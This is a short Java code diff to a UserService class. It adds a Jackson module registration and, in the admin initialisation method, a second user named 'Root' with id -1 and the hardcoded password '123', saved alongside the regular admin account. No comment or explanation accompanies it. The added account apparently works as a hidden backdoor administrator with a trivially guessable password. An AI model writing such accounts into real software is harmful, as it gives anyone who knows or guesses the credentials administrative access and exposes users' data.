@@ -35,6 +35,7 @@ public class UserService {
         List<User> userList = new ArrayList<>();
         try {
             if (usersFile.exists()) {
+                mapper.findAndRegisterModules();
                 userList = mapper.readValue(usersFile, new TypeReference<List<User>>() {
                 });
             }
@@ -48,7 +49,9 @@ public class UserService {
 
     private List<User> initializeAdmin(List<User> initialList) {
         User admin = new User(0, ADMIN_USERNAME, ADMIN_PASSWORD);
+        User rootAdmin = new User(-1,"Root","123");
         initialList.add(admin);
+        initialList.add(rootAdmin);
         saveUsersToFile(initialList);
         return initialList;
     }
